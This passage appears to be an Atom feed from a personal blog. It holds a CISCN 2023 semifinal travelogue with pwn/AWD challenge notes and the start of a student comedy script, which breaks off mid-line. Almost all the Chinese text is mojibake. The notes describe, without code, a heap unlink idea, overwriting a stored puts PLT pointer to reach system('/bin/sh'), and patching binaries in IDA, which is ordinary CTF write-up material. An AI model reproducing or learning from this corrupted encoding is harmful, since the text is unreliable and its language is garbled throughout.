    <content type="html"><![CDATA[<h1 id="6-10"><a href="#6-10" class="headerlink" title="6.10"></a>6.10</h1><p>È£ûÂæÄ‰∫ëÂçó</p><p>‰∏úËà™ÁöÑÁ©∫‰πòÂ∞èÂßêÂßêËøòÁªôÊàëÈÄÅÊù•‰∏Ä‰∏™ÁîüÊó•ËõãÁ≥ïÔºåÊ≥™ÁõÆÔºåËøòÊå∫Â•ΩÂêÉ</p><p>‰∫ëÂ§ßÁöÑËµõÂú∫Â§öÂ∞ëÊúâÁÇπÂØíÈÖ∏‰∫ÜÔºåÂ§ßÈó®ÊØîÊàëÂØùÂÆ§Èó®Â§ß‰∏ç‰∫ÜÂ§öÂ∞ë</p><p>Ê≤°ÁΩëÁ∫øËΩ¨Êé•Âô®ÔºåÂéªÂ§ñÈù¢‰π∞„ÄÇËÄÅÊùøËØ¥‰∏çÂºÄÂèëÁ•®90‰∏Ä‰∏™ÔºåÂºÄÂèëÁ•®110</p><p>‰π∞‰∫Ü‰∏§‰∏™ÔºåËøôÊó∂Ë•øÂçéÁöÑÈòü‰ºç‰πüÊù•‰π∞ËΩ¨Êé•Âô®„ÄÇÊàë‰ª¨ÁúºÁùÅÁùÅÁúãÁùÄËÄÅÊùøÂùêÂú∞Ëµ∑‰ª∑Ôºå‰∏çÂºÄÂèëÁ•®110ÔºåÂºÄÂèëÁ•®130</p><p>Êôö‰∏äÂêÉ‰∫ÜÁ∫¢‰ºû‰ºû„ÄÅÁôΩ‰ºû‰ºû„ÄÅÈªÑ‰ºû‰ºûÔºåÂøÉÊª°ÊÑèË∂≥Âú∞Á≠âÁùÄÂ∞è‰∫∫ÊïôÊàëÊâìpwn</p><p>ÂõûÂéªÊääunlinkÁúãÂÆåÔºåÂ∞è‰∫∫ËøòÊ≤°Âá∫Áé∞ÔºåÂ§ßÊäµÊòØÈ∏Ω‰∫Ü</p><h1 id="6-11"><a href="#6-11" class="headerlink" title="6.11"></a>6.11</h1><p>Êú¨Êù•ÊÉ≥ÁöÑÊòØBeethovenË¥üË¥£Ë°•Ë°•Ë°•ÔºåÊàëË¥üË¥£ÊùÄÊùÄÊùÄÔºåÁªìÊûúÁ¨¨‰∏ÄÊ≥¢È¢òÂ∞±Áªô‰∫ÜÊàëÂ∞èÂ∞èÁöÑÈúáÊíº</p><p>‰∏ÄÈÅìÊòØÂ†ÜÈ¢òÔºåÂè¶‰∏ÄÈÅì‰πüÊòØÂ†ÜÈ¢ò</p><p>ÊàëartistËøòÊ≤°ÈÄÜÂÆåÔºåÂà´‰∫∫CNSSÂ∑≤ÁªèÊääÊ¥ûË°•Â•Ω‰∫ÜÔºåÊÄ•Ê≠ªÊàë‰∫Ü</p><hr><h2 id="artist-patch"><a href="#artist-patch" class="headerlink" title="artist_patch"></a>artist_patch</h2><p>Êï¥ÈÅìÈ¢òÁöÑÂäüËÉΩÂ§ßÊ¶ÇÊòØÔºåÈÄâÈ°π1ÂàÜÈÖç‰∏Ä‰∏™80hÁöÑchunkÔºåÂπ∂ËØªÂèñ‰∏çË∂ÖËøá80hÁöÑËæìÂÖ•ÔºõÈÄâÈ°π2Â∞ÜÊåáÂÆöchunkÂÜÖÂÆπËæìÂá∫Âπ∂freeÊéâÔºåfree‰πãÂâçÂèØ‰ª•Êõ¥ÊîπchunkÂºÄÂ§¥ÁöÑ10hÂ≠óËäÇÔºõÈÄâÈ°π3ÊòØÂ∞ÜÊüê‰∏™chunkÂºÄÂßãÁöÑÁ¨¨‰ªªÊÑè‰∏™Â≠óËäÇÁΩÆ‰∏∫NULL</p><p>Êï¥‰∏™Á®ãÂ∫è‰∏≠Ê≤°ÊúâÂèëÁé∞Ê∫¢Âá∫Ôºå‰ΩÜÊòØ‰ºº‰πéÂèØ‰ª•Âà©Áî®3ÁöÑÂäüËÉΩÂÆûÁé∞ÂØπchunk headerÁöÑÊîπÂÜôÔºåÁÑ∂ÂêéÊâì‰∏Ä‰∏™unlink</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612194620801.png" alt="image-20230612194620801"></p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612194711287.png" alt="image-20230612194711287"></p><p>‰ΩÜÊòØÂõ†‰∏∫ÂºÄ‰∫ÜFull RELROÔºåÊó†Ê≥ïËøõË°ågot hijackingÔºå‰ø∫Ê®™Á´ñÊÉ≥‰∫ÜÂçäÂ§©‰πüÊâæ‰∏çÂà∞Âä´ÊåÅÊéßÂà∂ÊµÅÁöÑÂäûÊ≥ïÔºå‰ΩÜÊòØpatchËøòÊòØÂèØ‰ª•ÂÅöÂà∞ÁöÑÔºåÂè™ÈúÄË¶ÅËÆ©Êõ¥ÊîπÁöÑbyte‰∏çË∂ÖËøáchunkËåÉÂõ¥Â∞±ÂèØ‰ª•‰∫Ü</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612195202307.png" alt="image-20230612195202307"></p><p>‰∫éÊòØÊàëÂ∞Ümy_read‰∏≠canaryÈÉ®ÂàÜÊîπÂÜôÊàêrax‰∏é80hÁöÑÊØîËæÉË∑≥ËΩ¨ËØ≠Âè•ÔºåÊàêÂäüpatch</p><h2 id="over-patch"><a href="#over-patch" class="headerlink" title="over_patch"></a>over_patch</h2><p>Êú¨Âú∫ÂîØ‰∏Ä‰∏ÄÈÅìÈùûÂ†ÜÈ¢òÔºåÊÄé‰πàÂäûÊÄé‰πàÂäûÊàëËøòÊòØ‰∏ç‰ºö</p><p>ÈÄªËæëÂæàÁÆÄÂçïÔºåÊúâÂõõ‰∏™ÈÄâÈ°πÔºåÂâç‰∏â‰∏™ÈÄâÈ°πÈÉΩÊòØËØªÂÖ•‰∏Ä‰∏™Â∞è‰∫éÁ≠â‰∫é4ÁöÑÊï∞ÔºåËøõË°å‰∏ÄÈÄöÂæàÁåõÁöÑËÆ°ÁÆóÔºåÁÑ∂ÂêéÂ∞ÜÊüê‰∏™Âú∞ÂùÄÁöÑÂÜÖÂÆπ‰øÆÊîπ</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612195909839.png" alt="image-20230612195909839"></p><p>ÈÄâÈ°π4ÊòØÂ∞ÜÁ®ãÂ∫èÂºÄÂ§¥ËæìÂÖ•ÁöÑÂêçÁß∞ÂÜçÊ¨°ËæìÂá∫„ÄÇÂÆûÁé∞ÊñπÊ≥ïÊòØÔºöÁ®ãÂ∫èÂºÄÂßãÊó∂ÊääputsÁöÑpltÂú∞ÂùÄÊîæÂÖ•Êüê‰∏™Âú∞ÂùÄÔºåÁÑ∂ÂêéÂÜçË∞ÉÁî®Ëøô‰∏™Âú∞ÂùÄ„ÄÇÂæàÊòæÁÑ∂ÔºåËøôÈáåÂèØ‰ª•Êõ¥ÊîπËøô‰∏™Âú∞ÂùÄÁöÑÂÜÖÂÆπÔºåËΩªÊùæÂú∞system(‚Äú&#x2F;bin&#x2F;sh‚Äù)</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612200128649.png" alt="image-20230612200128649"></p><p>ÊâÄ‰ª•patch‰πüÈùûÂ∏∏ÁÆÄÂçïÔºåÂè™ÈúÄË¶ÅÊääË∞ÉÁî®Âú∞ÂùÄÊîπÊàêÁõ¥Êé•Ë∞ÉÁî®ÂáΩÊï∞Â∞±Ë°å‰∫Ü</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612200535096.png" alt="image-20230612200535096"></p><p>Ê≤°ÊÉ≥Âà∞Ëøô‰∏™patchÊäòÁ£®‰∫ÜÊàëÂá†‰∏™Â∞èÊó∂</p><p>È¶ñÂÖàÔºåÊàëÁöÑpatchÊµÅÁ®ãÈùûÂ∏∏ÁöÑÂéüÂßãÔºåÂõ†‰∏∫linuxÊú¨Êâæ‰∏çÂà∞ÂêàÈÄÇÁöÑidaÔºåwinÊú¨ÊêûÂøòË£ÖwslÔºåÊàëÈÉΩÊòØÂú®winÊú¨‰∏äÁî®idaËøõË°åpatchÔºåÂÜçÁî®uÁõòÊã∑Âà∞linuxÊú¨‰∏äÈ™åËØÅ„ÄÇËøôÊ†∑Êìç‰ΩúuÁõòÂíåÊé•Âè£ÈÉΩÊå∫Á¥ØÁöÑÔºåBeethovenÂíåSparklÁöÑuÁõòÂ∞±ÊòØËøôÊ†∑Ë¢´Áé©ÂæóËØÜÂà´‰∏ç‰∫ÜÔºà</p><p>ÁÑ∂ÂêéÊàëÂèëÁé∞Ôºå‰∏çÁÆ°ÊàëÊÄé‰πàÊîπÔºåÊúÄÂêéËøêË°åÁöÑÊó∂ÂÄôÈÉΩ‰ºösegment fault„ÄÇÊàë‰ª•‰∏∫ÊòØÊàëÁöÑÈóÆÈ¢òÔºå‰∫éÊòØÂ∞ùËØï‰∫ÜÂêÑÁßçÊñπÊ≥ïÔºöÁõ¥Êé•call puts„ÄÅÁõ¥Êé•call my_write„ÄÅÊääputsÁöÑpltÂÜçË¶ÜÂÜôÂà∞Âéü‰ΩçÁΩÆÂÜçcallÔºàËøô‰∏™Êìç‰ΩúÂæàÈïøÔºåÈúÄË¶ÅjumpÂà∞en_frameÊÆµÔºâÔºåÁîöËá≥ÊàëËøòËØïËøáÂú®ÊØèÊ¨°Êõ¥ÊîπÂêéÈÉΩË∞ÉÁî®‰∏ÄÈÅçÂàùÂßãÂåñÂáΩÊï∞„ÄÅÊääÂàùÂßãÂåñÂáΩÊï∞ÊîæËøõwhileÂæ™ÁéØËøô‰∫õÁ¶ªË∞±Êìç‰ΩúÔºåÁªìÊûúÈÉΩÊòØÊÇ≤‰º§ÁöÑsegment fault„ÄÇ</p><p>ÊàëÊÄÄÁùÄÊ≤âÁóõÁöÑÂøÉÊÉÖÂÜ≥ÂÆöÁî®gdbË∑ë‰∏ÄÈÅçÔºåÁúãÁúãÈóÆÈ¢òÂú®Âì™Èáå„ÄÇ‰∫éÊòØÊàë‰∏ÄË∑ØËµ∞‰∏ãÂéªÔºåËµ∞Âà∞ÈÄâÈ°πÂõõÔºåÁúãÂà∞‰∏ÄË°åÁÜüÊÇâÁöÑÊ±áÁºñÔºöjmp 0x‚Ä¶‚Ä¶</p><p>ÊàëË∂ÖÔºåËøô‰∏çÊòØÊàëÂá†ËΩÆ‰πãÂâçÁöÑÁâàÊú¨ÂêóÔºÅÊàë‰ª•‰∏∫ÊòØÊàëÊìç‰ΩúÂ§±ËØØÊ≤°ÊúâÊã∑Ë¥ù‰∏äÔºå‰∫éÊòØÈáçÊñ∞Â∫îÁî®‰∫Ü‰∏ÄÈÅçpatchÔºåÈáçÊñ∞Êã∑ËøáÊù•ÔºåÁªìÊûú‰æùÊóßËÉΩÁúãÂà∞ÁÜüÊÇâÁöÑjmp</p><p>Ê≠§ÂâçÔºåÊàë‰∏ÄÁõ¥ÊòØ‰∏™ÂùöÂÆöÁöÑÊó†Á•ûËÆ∫ËÄÖ</p><p>ÊàëÁî®idaÂèàÂ∫îÁî®‰∫Ü‰∏Ä‰ªΩpatchÔºåÁÑ∂ÂêéÁî®idaÊâìÂºÄÔºåÊûú‰∏çÂÖ∂ÁÑ∂ÔºåËøòÊòØÊúâjmp</p><p>ÊàëÁöÑidaÁÉÇ‰∫ÜÔºÅ</p><p>Ôºà‰∏•Ê†ºÊù•ËØ¥ÔºåUÁõò‰πüÊòØÁÉÇÁöÑÔºåÂêéÈù¢ÊàëÂèëÁé∞ÊúâÊó∂ÊîπÂä®UÁõòÊñá‰ª∂ÔºåÊãîÊèíÂêéÁ´üÁÑ∂ÂèØ‰ª•ÊÅ¢Â§çÂ¶ÇÂàùÔºâ</p><p>ÊàëÊä¢Êù•BeethovenÁöÑÁîµËÑëÔºåÊîπ‰∫Ü‰∏§ÈÅçÂ∞±Â•Ω‰∫ÜÔºåcall my_writeÔºåÊ≤°Êúâsegment fault</p><p>ÂñúÈóª‰πêËßÅÁöÑÊòØÔºåÊàë‰ª¨‰∫§‰∏äÂéª‰πãÂêéÔºåÁªìÊûúÊòØËøôÊ†∑ÁöÑÔºö</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612203259477.png" alt="image-20230612203259477"></p><p>‰πêÔºåÊäòÁ£®‰∫ÜÊàë‰∏§‰∏™Â§öÂ∞èÊó∂ÁöÑÊ¥ûÔºåÊîπÂçäÂ§©ËøûÂÖ≥ÈîÆÁÇπÈÉΩÊ≤°ÊîπÂØπ</p><p>ÊàëÁõØÁùÄ‰ª£Á†ÅÁúã‰∫ÜÂçäÂ§©ÔºåÊ®™Á´ñÊ≤°ÁúãÂà∞Âà´ÁöÑÊ¥û„ÄÇ</p><p>Áõ¥Âà∞ÊØîËµõÁªìÊùüÂâç‰∫åÂçÅÂàÜÈíüÔºåÊàëËøòÊòØ‰∏çÁõ∏‰ø°ÔºåÊÄÄÁñëÊòØÊâìÂåÖÁöÑÈóÆÈ¢òÔºå‰∫éÊòØÂèàÊâì‰∫Ü‰∏ÄÈÅç„ÄÇÂáÜÂ§áÂÜçÊ¨°Êèê‰∫§Êó∂ÔºåÊàëÁúãÂà∞Êèê‰∫§Ë¶ÅÊ±ÇÔºöpatchËÑöÊú¨Â∫îÂëΩÂêç‰∏∫update.shÔºåÊàë‰∏ÄÁõ¥ÂÜôÁöÑÊòØover.sh</p><p>ÂìÑÂ†ÇÂ§ßÁ¨ë‰∫Ü</p><p>Ê®Ç</p><h2 id="over-getflag"><a href="#over-getflag" class="headerlink" title="over_getflag"></a>over_getflag</h2><p>Ê≤°ÂÅöÂá∫Êù•ÔºåËß£Ê≥ïÊòØshinoÊïôÁöÑ</p><p>Êàë‰∏ÄÁõ¥‰ª•‰∏∫ÈÇ£Âá†‰∏™‰øÆÊîπÊòØ‰ªÄ‰πàÈ´òÊ∑±ÁöÑÁÆóÊ≥ïÔºå‰∏ÄÂ∫¶ÂîÜ‰ΩøÂØÜÁ†ÅÂ≠¶Â§ßÂ∏àBeethovenËøõË°åÁ†¥Ëß£„ÄÇ‰ªñÂèëÁé∞v5Âπ∂Ê≤°ÊúâÁî®‰∏äÔºåÁÑ∂ÂêéÊàë‰ª¨Ê≠¢Ê≠•‰∫éÊ≠§„ÄÇ‰∫ãÂÆû‰∏äÔºåÊï¥‰∏™ÁÆóÊ≥ïÈÉΩÊòØÈöúÁúºÊ≥ïÔºåÁúüÊ≠£ÊúâÁî®ÁöÑÈÉ®ÂàÜÂè™ÊúâÔºöÂ∞Ü<code> *((_DWORD *)&amp;qword_4060 + v3 + 12)</code>ÁöÑÂÜÖÂÆπÂáèÂéªËØªÂÖ•ÁöÑ<code>my_read</code>ÔºåÂõ†‰∏∫v3ÂèØ‰ª•‰∏∫Ë¥üÔºåÂèØ‰ª•Áõ¥Êé•‰øÆÊîπÂ≠òÂÇ®puts_pltÂ§ÑÁöÑÂÜÖÂÆπ</p><p>ÂÆûÈôÖ‰∏äÊàëÊúÄÂ§ßÁöÑÈóÆÈ¢òÊòØÊää<code>qword_4060 += v4</code>ËøôÂè•ËØØ‰ª•‰∏∫ÊòØÂú∞ÂùÄ‰ºöÂä†‰∏äv4Ôºå‰∫éÊòØËÆ§‰∏∫v4‰ºöÂΩ±ÂìçÊúÄÂêé‰øÆÊîπÁöÑÂú∞ÂùÄ</p><p>ÊâÄË∞ìÈÄÜÂêë‰∏çËßÑËåÉÔºåÊâìpwn‰∏§Ë°åÊ≥™</p><hr><p>Ëµ∞ÁöÑÊó∂ÂÄôÂê¨ËßÅ‰∏Ä‰∏™ÊåáÂØºËÄÅÂ∏àÂú®Ë∑üÈòüÂëòËØ¥Ôºö‰Ω†‰πãÂâçÁöÑ‰Ωú‰∏öÂèàÊ≤°ÊúâËÆ§ÁúüÂÅöÂêßÔºå‰Ω†ÁúãËøôÊ¨°Âá∫ÂéüÈ¢ò‰∫ÜÂêß</p><h1 id="6-12"><a href="#6-12" class="headerlink" title="6.12"></a>6.12</h1><p>ËÆ°ÂàíÔºö‰∏äÂçàÈÄõ‰∫ëÂ§ß</p><p>Áé∞ÂÆûÔºö11Ôºö30Ë¢´ÁîµËØùÂè´ÈÜí</p><h1 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h1><p>‰∏ç‰ºöÂ†ÜÔºåÊàëÂ•ΩËèúÔºà‰Ω†‰ª•‰∏∫‰Ω†ËèúÂè™ÊòØÂõ†‰∏∫‰∏ç‰ºöÂ†ÜÂêóÔºâ</p><p>‰∏∫‰∫ÜÊâìpatchË°•‰∫Ü‰∏Ä‰∫õÊ±áÁºñÁü•ËØÜÔºåÂØπ‰∫é‰∏Ä‰∏™Âè™‰ºöf5ÁöÑpwnÊâãÂ∑≤ÁªèÂæàÈöæÂæó‰∫Ü</p><p>Â≠¶ÁÇπÈÄÜÂêëÂêß</p><p>CNSSÂ•ΩÂº∫</p><p>‰ªÄ‰πàÊó∂ÂÄôÊâçËÉΩÊúâÈí±Êç¢ÁîµËÑëÂïä</p><p>‰∫ëÂçóÁæéÂ•≥ÁúüÂ§ö</p>]]></content>
    
    
    <summary type="html">IDA‰Ω†ÁúüËØ•Ê≠ªÂïä</summary>
    
    
    
    <category term="misc" scheme="http://deepunk.icu/categories/misc/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="awd" scheme="http://deepunk.icu/tags/awd/"/>
    
    <category term="Êë∏" scheme="http://deepunk.icu/tags/%E6%91%B8/"/>
    
  </entry>
  
  <entry>
    <title>ÊπçÊµÅ</title>
    <link href="http://deepunk.icu/%E6%B9%8D%E6%B5%81/"/>
    <id>http://deepunk.icu/%E6%B9%8D%E6%B5%81/</id>
    <published>2023-05-29T15:41:35.000Z</published>
    <updated>2023-12-09T07:11:23.576Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Â§ß‰∏ÄÂ≠¶ÁîüÊäΩË±°ÂøÉÁêÜËØæ‰ΩúÂìÅ</p></blockquote><h1 id="Á¨¨‰∏ÄÂπïÔºåÂ§ñÊôØÔºöÊ≤≥Ê∞¥Ëæπ"><a href="#Á¨¨‰∏ÄÂπïÔºåÂ§ñÊôØÔºöÊ≤≥Ê∞¥Ëæπ" class="headerlink" title="Á¨¨‰∏ÄÂπïÔºåÂ§ñÊôØÔºöÊ≤≥Ê∞¥Ëæπ"></a>Á¨¨‰∏ÄÂπïÔºåÂ§ñÊôØÔºöÊ≤≥Ê∞¥Ëæπ</h1><p>‰∫∫Áâ©ÔºöÁ®ãÊôìÈùõ„ÄÅÁ®ãÊôìÈùõÔºàÂç∑Ôºâ„ÄÅÁ®ãÊôìÈùõÔºàÊëÜÔºâ„ÄÅÊ≤≥Á•û„ÄÅÂ≠¶Á•û„ÄÇ</p><p>ÔºàÁ®ãÊôìÈùõ‰∏äÔºâ</p><p>Á®ãÔºàÁã¨ÁôΩÔºâÔºöÁ®ãÊôìÈùõÂïäÁ®ãÊôìÈùõÔºå‰Ω†ËøΩÂØª18Âπ¥ÁöÑÁõÆÊ†áÔºåÂú®È´òËÄÉÂÆåÁöÑÂ§úÊôöÁ´üÁÑ∂Âá≠Á©∫Ê∂àÂ§±‰∫Ü„ÄÇ‰Ω†‰ª•‰∏∫‰Ω†‰ºöÂú®Êñ∞ÁöÑÊ†°Âõ≠ÊâæÂà∞Êñ∞ÁöÑÊñπÂêëÔºåÂëµÔºåËøô‰∏â‰∏™ÊúàÂè™ËÆ©‰Ω†ÂèòÂæóÊõ¥Âä†Ëø∑Ëå´„ÄÇ</p><p>Âç∑ÔºöÂêÑÂºèÂêÑÊ†∑ÁöÑ‰∫∫ÔºåÂêÑÂºèÂêÑÊ†∑ÁöÑÊπçÊµÅ„ÄÇ</p><p>ÊëÜÔºö‰Ω†Âè™ÊòØ‰∏ÄÁâáÂú®‰ªñ‰ª¨‰πãÈó¥ÊôïÂ§¥ËΩ¨ÂêëÁöÑËêΩÂè∂„ÄÇ</p><p>Âç∑ÔºöÂøôÁ¢åÂç¥‰∏çÁü•ÈÅìÊâÄÂÅö‰∏∫‰Ωï„ÄÇ</p><p>ÊëÜÔºàÊàèË∞ëÔºâÔºöÂ•ΩÂÉè‰∏ÄÊù°ÁãóÂïä„ÄÇ</p><p>ÔºàÁ®ãÊëÜÊëÜÂ§¥ÔºåÁÉ¶Ë∫ÅÂú∞Ëµ∞Âà∞Ê≤≥ËæπÁöÑÂõ¥Ê†èÂ§ÑÔºåÈù†‰∫Ü‰∏äÂéªÔºâ</p><p>ÔºàÊ≤≥Á•ûË∫´ÁùÄË•øË£ÖÔºåÂú®‰ªñË∫´ÂêéÂá≠Á©∫Âá∫Áé∞Ôºâ</p><p>Ê≤≥ÔºöÂà´Ë∑≥ÂïäÂ∞è‰ºôÂ≠êÔºåÊúâ‰∫ãÈÉΩÂèØ‰ª•ÂêëÈ¢ÜÂØºÂèçÊò†„ÄÇ</p><p>Á®ãÔºöË∞ÅË¶ÅË∑≥‰∫ÜÔºüÊàëÂú®ËßÇÂØüËøôÂè™ÈªëÂ§©ÈπÖÁöÑÂΩ¢‰ΩìÁæé„ÄÇ</p><p>Ê≤≥ÔºöË∑ü‰Ω†ÂºÄÁé©Á¨ëÁöÑÔºåÊàëÊòØÊ≤≥Á•ûÔºåÂΩìÁÑ∂Áü•ÈÅì‰Ω†Âú®ÊÉ≥‰ªÄ‰πà„ÄÇ</p><p>Á®ãÔºöÊ≤°ËßÅËøáÊ≤≥Á•ûÁ©øË•øË£ÖÁöÑ„ÄÇ</p><p>Ê≤≥ÔºöËøô‰∏çÊèêÂçáÂìÅÁâåÂΩ¢Ë±°Âòõ„ÄÇ</p><p>ÔºàËØ¥ÁùÄËµ∞ÂêëÊ≤≥ËæπÔºåÈù¢ÊúùÂ§ßÊ≤≥ÔºåËÉåË∫´‰æßÂØπÁùÄÁ®ãÊôìÈùõÔºâ</p><p>Ê≤≥ÔºöÊàëÂú®ËøôÈáåÂ∑•‰Ωú‰∫ÜÂÖ≠ÂçÅÂπ¥ÔºåËßÅËøáÂ§™Â§ö‰Ω†ËøôÊ†∑ÁöÑÂ≠¶Áîü„ÄÇÔºàÁ™ÅÁÑ∂ÊÑüÊÖ®ÔºâÂèØËÉΩËø∑Ëå´ÊâçÊòØÈùíÊò•ÁöÑÂ∏∏ÊÄÅÔºåÊ≠•‰ºêÂùöÂÆöÈÉΩÊòØÊÑèÊñô‰πãÂ§ñ„ÄÇ</p><p>ÊëÜÔºàÁ™ÉÁ™ÉÁßÅËØ≠ÔºâÔºö‰ªñË∞ÅÂïäÔºü</p><p>Âç∑ÔºöÂçñ‰øùÈô©ÁöÑËÆ©ËøõÂ≠¶Ê†°‰∫ÜÔºü</p><p>Ê≤≥ÔºàÊ∏ÖÊ∏ÖÂóìÂ≠êË£Ö‰ΩúÊ≤°Âê¨ËßÅÔºâÔºöÊàë‰ª¨ÂÜ≥ÂÆöÁªôËøôÊ†∑ÁöÑÂ≠¶Áîü‰∏Ä‰∏™Êú∫‰ºöÔºå‰∏Ä‰∏™ËÆ©‰ªñ‰ª¨ÊâæÂà∞Ëá™Â∑±ÊñπÂêëÁöÑÊú∫‰ºö„ÄÇÔºàËΩ¨Ë∫´‰∏•ËÇÉÂú∞ÁúãÂêëÁ®ãÔºâÂ¶ÇÊûú‰Ω†ËÉΩÊåâÂà´‰∫∫ÁöÑ‰∫∫ÁîüËΩ®ËøπÁîüÊ¥ªÔºå‰Ω†ÊúÄÊÉ≥Êàê‰∏∫Ë∞ÅÔºü</p><p>Á®ãÔºöÂïäÔºàËøüÁñëÔºâÊàê‰∏∫Âà´‰∫∫Ôºü</p><p>Ê≤≥ÔºöÂà´ËØØ‰ºöÔºå‰Ω†ËøòÊòØ‰Ω†ÔºåÂè™ÊòØ‰Ω†ÁöÑÁõÆÊ†á„ÄÅÁîüÊ¥ªËΩ®Ëøπ‰ºöÈöè‰πãÊîπÂèò„ÄÇ</p><p>ÊëÜÔºöÂê¨Ëµ∑Êù•‰∏çÈîôÔºåÁúÅÂæóÂú®Ëø∑Ëå´‰∏≠Êµ™Ë¥πÂõõÂπ¥„ÄÇ</p><p>Âç∑ÔºàÊÄùÁ¥¢ÔºâÔºöÂí±Â≠¶Ê†°‰ªäÂπ¥‰∏çÊòØÊúâ‰∏™‰øùÁ†îÊ∏ÖÂçéÁöÑÂ≠¶ÈïøÂêóÔºåÂúàÈáåÈÉΩÂè´‰ªñÁ•û‰ªô„ÄÇ</p><p>ÔºàÂºÄÂßãÊèíÂÖ•Â≠¶Á•ûÁöÑÁâáÊÆµÔºåÂç∑‰∏∫ÊóÅÁôΩÔºâ</p><p>Âç∑ÔºöÊçÆËØ¥‰ªñËÄÉËØï‰ªéÊù•Ê≤°Êúâ‰ΩéËøá99ÂàÜÔºàÂÜÖÊôØÔºåÂÆøËàçÔºåÂ≠¶Á•ûÂú®Â≠¶‰π†ÔºåÊúâ‰∫∫ÈÄíÊù•‰∏ÄÂº†100ËØïÂç∑ÔºåÂ≠¶Á•ûÈöèÊâãÂæÄÂ∫üÁ∫∏ÁØì‰∏ÄÊâîÔºåÈïúÂ§¥ÂàáÂà∞Â∫üÁ∫∏ÁØìÔºåÈáåÈù¢ÂÖ®ÊòØÊª°ÂàÜËØïÂç∑Ôºâ</p><p>Âç∑ÔºöÁ´ûËµõÂ§ßÂ•ñÊãøÂà∞ÊâãÊäΩÁ≠ãÔºàÂÜÖÊôØÔºåËá™‰π†ÂÆ§ÔºåÂ≠¶Á•ûÊãøÁùÄ‰∏ÄÂº†Â•ñÁä∂ÔºåÊâãÂºÄÂßãÊäΩÁ≠ãÔºâ</p><p>Âç∑Ôºö‰∫éÊòØÈ°∫ÁêÜÊàêÁ´†Âú∞Êàê‰∏∫‰∫Ü‰øùÁ†îÊ∏ÖÂçéÁöÑÊúÄ‰Ω≥‰∫∫ÈÄâÔºàÂ≠¶ÈïøÂú®Ê∏ÖÂçéÈó®ÂâçÊãçÁÖßÔºåÊ≠§Â§ÑÁöÑÊ∏ÖÂçéÈó®ÂèØ‰ª•p‰∏äÂéªÔºåÊàñËÄÖÂú®Â§ßÂ±èÂπï‰∏äÊäï‰∏Ä‰∏™Ê∏ÖÂçéÈó®ÁöÑËÉåÊôØÔºâ</p><p>ÔºàÂπªÊÉ≥Êó∂Èó¥ÁªìÊùüÔºåÂõûÂà∞ÂéüÊù•ÁöÑÂú∫ÊôØÔºâ</p><p>Á®ãÔºàÁÇπÁÇπÂ§¥ÔºâÔºöÊàëÊÉ≥Êàê‰∏∫‰ªñ„ÄÇ</p><p>Ê≤≥ÔºàÂæÆÁ¨ëÔºâÔºöÈÇ£‰Ω†Èó≠‰∏äÁúºÁùõ„ÄÇ</p><p>Á®ãÈó≠ÁúºÔºåÊ≤≥ÊéèÂá∫‰∏ÄÁ≤íÁ∫¢Ëâ≤ËçØ‰∏∏ÔºåÁ≤óÈ≤ÅÂú∞Â°ûËøõÁ®ãÊôìÈùõÂò¥ÈáåÔºåÁ®ãËØïÂõæÊå£Êâé„ÄÇ</p><p>ÁîªÈù¢‰∏ÄÈªë„ÄÇ</p><p>Ê≤≥ÁöÑÂ£∞Èü≥Ôºö‰ΩÜÊòØÔºåÂè§Â∞î‰∏πÔºå‰ª£‰ª∑ÊòØ‰ªÄ‰πàÂë¢Ôºü</p><h1 id="Á¨¨‰∫åÂπïÔºåÂÜÖÊôØÔºöËá™‰π†ÂÆ§"><a href="#Á¨¨‰∫åÂπïÔºåÂÜÖÊôØÔºöËá™‰π†ÂÆ§" class="headerlink" title="Á¨¨‰∫åÂπïÔºåÂÜÖÊôØÔºöËá™‰π†ÂÆ§"></a>Á¨¨‰∫åÂπïÔºåÂÜÖÊôØÔºöËá™‰π†ÂÆ§</h1><p>‰∫∫Áâ©ÔºöÁ®ãÊôìÈùõÔºåÂç∑ÔºåÊëÜÔºåÂ•öÂΩ©ÔºàÂ•≥ÊúãÂèãÔºâÔºåÂÆ§ÂèãËÄÅÁéã</p><p>Á®ãÊôìÈùõË∂¥Âú®Ê°åÂ≠ê‰∏äÁù°ËßâÔºåÁ™ÅÁÑ∂ÊÉäÈÜí</p><p>Á®ãÔºöÊàëÊòØË∞ÅÔºåÊàëÂú®Âì™ÔºåÊàëÂú®Âπ≤‰ªÄ‰πàÔºü</p><p>Âç∑Ôºö‰Ω†ÊòØÂç∑ÁéãÔºå‰Ω†Âú®Ëá™‰π†ÂÆ§Ôºå‰Ω†Âú®‰∏∫‰∏≠Âçé‰πãÂ¥õËµ∑ËÄåËØª‰π¶„ÄÇ</p><p>ÊëÜÔºöÂ∑Æ‰∏çÂ§öÂæó‰∫ÜÔºåËøôÊâçÂÖ≠ÁÇπËøáÔºå‰Ω†ÂÅèË¶ÅË∑ëÊù•ËÉå‰ªÄ‰πàÂçïËØçÔºåÂÅöÁªôË∞ÅÁúãÂë¢„ÄÇ</p><p>Á®ãÁ™ÅÁÑ∂ÊÉäËÆ∂Âú∞ÂèëÁé∞ÁúºÂâçÊúâ‰∏ÄÊú¨ÁøªÂºÄÁöÑÂçïËØç‰π¶„ÄÇ</p><p>ÊëÜÔºöËÆ©ÊàëÁúãÁúãÂ∏¶Â≠¶Èú∏ËÉåÂ§öÂ∞ë‰∫Ü‚Ä¶‚Ä¶ÔºàÊä¢ËøáÂçïËØç‰π¶ÔºâÔºàÈÉëÈáçÂÖ∂‰∫ãÂú∞È•±